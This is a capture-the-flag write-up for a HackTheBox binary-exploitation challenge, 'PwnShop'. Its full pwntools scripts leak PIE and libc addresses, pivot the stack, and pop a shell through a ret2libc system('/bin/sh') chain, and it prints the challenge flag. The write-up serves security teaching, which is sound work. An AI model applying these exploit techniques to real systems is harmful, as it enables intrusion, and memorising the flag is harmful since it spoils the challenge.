# PwnShop
> Write-up author: jon-brandy

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/1880b20e-d311-43e5-8816-9684d0e480cb)


## Lessons Learned:
1. Buffer Overflow.
2. Bypassing PIE and ASLR.
3. Implement Stack Pivot.
4. Implement ret2libc attack.

## DESCRIPTION:
We just opened a Pwn Shop, time to pwn all the things!
## STEPS:
1. In this challenge we're given a 64 bit binary, dynamically linked, and stripped.

```console
┌──(brandy㉿bread-yolk)-[~/Downloads/pwn_pwnshop]
└─$ file pwnshop
pwnshop: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e354418962cffebad74fa44061f8c58d92c0e706, for GNU/Linux 3.2.0, stripped
```

> BINARY PROTECTIONS

```console
┌──(brandy㉿bread-yolk)-[~/Downloads/pwn_pwnshop]
└─$ pwn checksec pwnshop                                    
[*] '/home/brandy/Downloads/pwn_pwnshop/pwnshop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

2. After decompiled the binary, it seems we can leak pie and calculate the piebase at the sell option.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/0bb3e8ee-b09d-411c-b73d-06d2f22a6e94)


3. We can use our classic way to leak pie by sending 7 bytes.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/5272357b-06b4-4846-875f-e95a21456cb6)


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/08f381c9-6586-417d-b82f-1806f2f7e1e7)


> SCRIPT

```py
from pwn import *
import os
os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript="""
init-pwndbg
continue
""".format(**locals())

exe = './pwnshop'
elf = context.binary = ELF(exe, checksec=True)
# context.log_level = 'DEBUG'
context.log_level = 'INFO'

sh = start()
pause()
sh.sendlineafter(b'>', b'2')
sh.sendlineafter(b'?', b'a')

## LEAKING PIE
sh.sendlineafter(b'?', b'A' * 7) 
sh.recvline()
get = unpack(sh.recv(6) + b'\x00' * 2)
log.success('LEAKED PIE --> %#0x', get)

elf.address = get - 0x40c0 # 16576
log.info(f'PIE BASE --> {hex(elf.address)}')

sh.interactive()
```

4. Next, analyzing the buy option, we know we can do BOF but sadly the space is too small.

> BUY OPTION

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/8b5b6c49-b20c-4ffd-b255-af1c1de0eac4)


5. Knowing there is no interesting function to jump to and NX is disabled, but there is BOF; we know the concept for this challenge is ret2libc.
6. But since the distance between RBP and RIP is too small, hence it's not enough for our payload, we need to do **stack pivot**.

### FLOW

> Payload we need to send

```
padding (need to calculate it first btw) + rdi_gadget + function@got + function@plt + return_symbol + sub_rsp_gadget.
```

> Grabbing sub_rsp (dunno why can't automate the grab using ropstar).

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/36d25dfd-4b78-4905-8fa9-629e28ff6c50)


> Calculating the padding

```
Find the rip offset using gdb, then get the length of our rop_payload, and lastly substract them.
```

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/ecb91286-0dfc-42f3-87fd-b4830653564a)


```console
gdb-peda$ pattern search
No register contains pattern buffer
Registers point to pattern buffer:
[RSI] --> offset 0 - size ~101
[RSP] --> offset 72 - size ~29
Pattern buffer found at:
0x00007fffffffdd50 : offset    0 - size   80 ($sp + -0x48 [-18 dwords])
References to pattern buffer found at:
0x00007fffffffb6c0 : 0x00007fffffffdd50 ($sp + -0x26d8 [-2486 dwords])
0x00007fffffffd998 : 0x00007fffffffdd50 ($sp + -0x400 [-256 dwords])
0x00007fffffffdc78 : 0x00007fffffffdd50 ($sp + -0x120 [-72 dwords])
```

```
Get the length of our rop payload.
```

```py
# ROP PAYLOAD
p = flat([
    rdi_gadget,
    elf.got['printf'],
    elf.plt['puts'],
    elf.address + 0x132a
])
```

```py
from pwn import *
import os
os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript="""
init-pwndbg
continue
""".format(**locals())

exe = './pwnshop'
elf = context.binary = ELF(exe, checksec=True)
# context.log_level = 'DEBUG'
context.log_level = 'INFO'

sh = start()
pause()
sh.sendlineafter(b'>', b'2')
sh.sendlineafter(b'?', b'a')

## LEAKING PIE
sh.sendlineafter(b'?', b'A' * 7) 
sh.recvline()
get = unpack(sh.recv(6) + b'\x00' * 2)
log.success('LEAKED PIE --> %#0x', get)

elf.address = get - 0x40c0 # 16576
log.info(f'PIE BASE --> {hex(elf.address)}')

rop = ROP(elf)
# sub_rsp_gadget = rop.find_gadget(['sub rsp', '0x28', 'ret'])[0] # sub rsp, 0x28; ret;
sub_rsp_gadget = elf.address + 0x1219
log.success(f'STACK PIVOT GADGET --> {hex(sub_rsp_gadget)}')
rdi_gadget = rop.find_gadget(['pop rdi', 'ret'])[0]
log.success(f'RDI GADGET --> {hex(rdi_gadget)}')
# sh.sendlineafter(b'>', b'1')
sh.sendlineafter(b'>', b'1')

# ROP PAYLOAD
p = flat([
    rdi_gadget,
    elf.got['printf'],
    elf.plt['puts'],
    elf.address + 0x132a
])

# calculate padding for our second payload (stack pivot)
rip_offset = 72
padding = rip_offset - len(p)
log.info(f'padding --> {padding}')

sh.interactive()
```

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/5098a61c-33dc-4aaf-9e2d-4a99a1343eb7)


> LEAKING LIBC

```py
from pwn import *
import os
os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript="""
init-pwndbg
continue
""".format(**locals())

exe = './pwnshop'
elf = context.binary = ELF(exe, checksec=True)
# context.log_level = 'DEBUG'
context.log_level = 'INFO'

sh = start()
pause()
sh.sendlineafter(b'>', b'2')
sh.sendlineafter(b'?', b'a')

## LEAKING PIE
sh.sendlineafter(b'?', b'A' * 7) 
sh.recvline()
get = unpack(sh.recv(6) + b'\x00' * 2)
log.success('LEAKED PIE --> %#0x', get)

elf.address = get - 0x40c0 # 16576
log.info(f'PIE BASE --> {hex(elf.address)}')

rop = ROP(elf)
# sub_rsp_gadget = rop.find_gadget(['sub rsp', '0x28', 'ret'])[0] # sub rsp, 0x28; ret;
sub_rsp_gadget = elf.address + 0x1219
log.success(f'STACK PIVOT GADGET --> {hex(sub_rsp_gadget)}')
rdi_gadget = rop.find_gadget(['pop rdi', 'ret'])[0]
log.success(f'RDI GADGET --> {hex(rdi_gadget)}')
# sh.sendlineafter(b'>', b'1')
sh.sendlineafter(b'>', b'1')

# ROP PAYLOAD
p = flat([
    rdi_gadget,
    elf.got['printf'],
    elf.plt['puts'],
    elf.address + 0x132a
])

# calculate padding for our second payload (stack pivot)
rip_offset = 72
padding = rip_offset - len(p)
log.info(f'padding --> {padding}')

pay = flat([
    asm('nop') * padding,
    rdi_gadget,
    elf.got['printf'],
    elf.plt['puts'],
    elf.address + 0x132a, # buy option
    sub_rsp_gadget
])

# sh.sendlineafter(b':', pay)
sh.sendafter(b':', pay)
leaked_libc = sh.recvline().strip()
# print(leaked_libc)
leaked_libc = unpack(leaked_libc.ljust(8,b'\x00'))
log.success(f'Leaked LIBC printf --> {hex(leaked_libc)}')

sh.interactive()
```

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/adc24faa-eca4-4f24-b5e3-bbd59f79152d)


7. Since we don't want to work twice (after succeed local, then identify the remote libc and try to get RCE remotely again), let's just send the script remotely and use the last 3 hex to find the remote libc in libc.blukat.

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/8408bbfe-2f48-4b88-baee-9a9df2d08372)


8. Hmm, let's leak another GOT function so we can get 1 result only.

> USING LEAKED READ

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/d01de361-9ebf-40dc-9b82-654a0764cb54)


9. Nice now let's run pwninit to patch the binary.

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/45e08bbc-2a87-4c43-990d-1057763a8ccf)


10. Let's calculate the libc base.

> SCRIPT

```py
from pwn import *
import os
os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript="""
init-pwndbg
continue
""".format(**locals())

# exe = './pwnshop'
exe = './pwnshop_patched'
elf = context.binary = ELF(exe, checksec=True)
# context.log_level = 'DEBUG'
context.log_level = 'INFO'

library = './libc6_2.23-0ubuntu11.2_amd64.so'
libc = context.binary = ELF(library, checksec=True)

sh = start()
pause()
sh.sendlineafter(b'>', b'2')
sh.sendlineafter(b'?', b'a')

## LEAKING PIE
sh.sendlineafter(b'?', b'A' * 7) 
sh.recvline()
get = unpack(sh.recv(6) + b'\x00' * 2)
log.success('LEAKED PIE --> %#0x', get)

elf.address = get - 0x40c0 # 16576
log.info(f'PIE BASE --> {hex(elf.address)}')

rop = ROP(elf)
# sub_rsp_gadget = rop.find_gadget(['sub rsp', '0x28', 'ret'])[0] # sub rsp, 0x28; ret;
sub_rsp_gadget = elf.address + 0x1219
log.success(f'STACK PIVOT GADGET --> {hex(sub_rsp_gadget)}')
rdi_gadget = rop.find_gadget(['pop rdi', 'ret'])[0]
log.success(f'RDI GADGET --> {hex(rdi_gadget)}')
# sh.sendlineafter(b'>', b'1')
sh.sendlineafter(b'>', b'1')

# ROP PAYLOAD
p = flat([
    rdi_gadget,
    elf.got['printf'],
    elf.plt['puts'],
    elf.address + 0x132a
])

# calculate padding for our second payload (stack pivot)
rip_offset = 72
padding = rip_offset - len(p)
log.info(f'padding --> {padding}')

## LEAKING PRINTF@GOT
pay = flat([
    asm('nop') * padding,
    rdi_gadget,
    elf.got['printf'],
    elf.plt['puts'],
    elf.address + 0x132a, # buy option
    sub_rsp_gadget
])

## LEAKING READ@GOT
# pay = flat([
#     asm('nop') * padding,
#     rdi_gadget,
#     elf.got['read'],
#     elf.plt['puts'],
#     elf.address + 0x132a, # buy option
#     sub_rsp_gadget
# ])

# sh.sendlineafter(b':', pay)
sh.sendafter(b':', pay)
leaked_libc = sh.recvline().strip()
# print(leaked_libc)
leaked_libc = unpack(leaked_libc.ljust(8,b'\x00'))
log.success(f'Leaked LIBC printf --> {hex(leaked_libc)}')

## CALCULATING LIBC BASE
libc.address = leaked_libc - libc.sym['printf']
log.success('LIBC BASE --> %#0x', libc.address) 

sh.interactive()
```

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/93055175-0454-4aa6-862a-257e7052e15a)


11. All good, let's send our ret2libc payload along with our stack pivot.

### GETTING RCE | ADDED A ROPSTAR SCRIPT FOR BETTER AUTOMATION

```py
from pwn import *
import os
os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript="""
init-pwndbg
continue
""".format(**locals())

# exe = './pwnshop'
exe = './pwnshop_patched'
elf = context.binary = ELF(exe, checksec=True)
# context.log_level = 'DEBUG'
context.log_level = 'INFO'

library = './libc6_2.23-0ubuntu11.2_amd64.so'
libc = context.binary = ELF(library, checksec=True)

sh = start()
# pause()
sh.sendlineafter(b'>', b'2')
sh.sendlineafter(b'?', b'a')

## LEAKING PIE
sh.sendlineafter(b'?', b'A' * 7) 
sh.recvline()
get = unpack(sh.recv(6) + b'\x00' * 2)
log.success('LEAKED PIE --> %#0x', get)

elf.address = get - 0x40c0 # 16576
log.info(f'PIE BASE --> {hex(elf.address)}')

rop = ROP(elf)
# sub_rsp_gadget = rop.find_gadget(['sub rsp', '0x28', 'ret'])[0] # sub rsp, 0x28; ret;
sub_rsp_gadget = elf.address + 0x1219
log.success(f'STACK PIVOT GADGET --> {hex(sub_rsp_gadget)}')
rdi_gadget = rop.find_gadget(['pop rdi', 'ret'])[0]
log.success(f'RDI GADGET --> {hex(rdi_gadget)}')
# sh.sendlineafter(b'>', b'1')
sh.sendlineafter(b'>', b'1')

# ROP PAYLOAD
p = flat([
    rdi_gadget,
    elf.got['printf'],
    elf.plt['puts'],
    elf.address + 0x132a
])

# calculate padding for our second payload (stack pivot)
rip_offset = 72
padding = rip_offset - len(p)
log.info(f'padding --> {padding}')

## LEAKING PRINTF@GOT
pay = flat([
    asm('nop') * padding,
    rdi_gadget,
    elf.got['printf'],
    elf.plt['puts'],
    elf.address + 0x132a, # buy option
    sub_rsp_gadget
])

## LEAKING READ@GOT
# pay = flat([
#     asm('nop') * padding,
#     rdi_gadget,
#     elf.got['read'],
#     elf.plt['puts'],
#     elf.address + 0x132a, # buy option
#     sub_rsp_gadget
# ])

# sh.sendlineafter(b':', pay)
sh.sendafter(b':', pay)
leaked_libc = sh.recvline().strip()
# print(leaked_libc)
leaked_libc = unpack(leaked_libc.ljust(8,b'\x00'))
log.success(f'Leaked LIBC printf --> {hex(leaked_libc)}')

## CALCULATING LIBC BASE
libc.address = leaked_libc - libc.sym['printf']
log.success('LIBC BASE --> %#0x', libc.address) 

ret_addr = rop.find_gadget(['ret'])[0]
log.success(f'ret gadget --> {ret_addr}')

## RET2LIBC PAYLOAD
# payload = flat([
#     asm('nop') * padding,
#     ret_addr,
#     rdi_gadget,
#     next(libc.search(b'/bin/sh\x00')),
#     libc.sym['system'],
#     sub_rsp_gadget
# ])

## USING ROPSTAR
libcrop = ROP(libc)
libcrop.call(rop.find_gadget(['ret'])[0])
libcrop.call(libc.sym['system'], [next(libc.search(b'/bin/sh\x00'))])
libcrop.call(sub_rsp_gadget)
payload = asm('nop') * 40 
payload += libcrop.chain()
log.info(libcrop.dump())
print(payload)

sh.sendlineafter(b':', payload)

sh.interactive()
```

> RESULT IN LOCAL

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/c99fd181-398b-4751-9e22-d60b77a7ed99)


> TEST REMOTELY

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/bc3bc14a-7ebf-4d57-81f6-b9ba284b40ff)


12. Got the flag.

## FLAG

```
HTB{th1s_is_wh@t_I_c@ll_a_g00d_d3a1!}
```











